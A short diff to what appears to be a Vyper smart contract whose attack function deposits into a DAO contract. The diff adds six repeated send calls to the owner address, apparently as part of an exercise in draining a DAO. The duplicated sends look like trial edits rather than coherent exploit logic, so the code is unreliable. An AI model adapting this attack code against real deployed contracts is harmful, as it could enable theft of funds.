@@ -57,7 +57,12 @@ def attack(dao_address:address):
     DAO(self.owner_address).deposit(value = deposit_amount)
     
     send(self.owner_address, msg.value)
+    send(self.owner_address, msg.value)
+    send(self.owner_address, msg.value)
    
+    send(self.owner_address, value = deposit_amount)
+    send(self.owner_address, value = deposit_amount)
+    send(self.owner_address, value = deposit_amount)
     
     pass
 
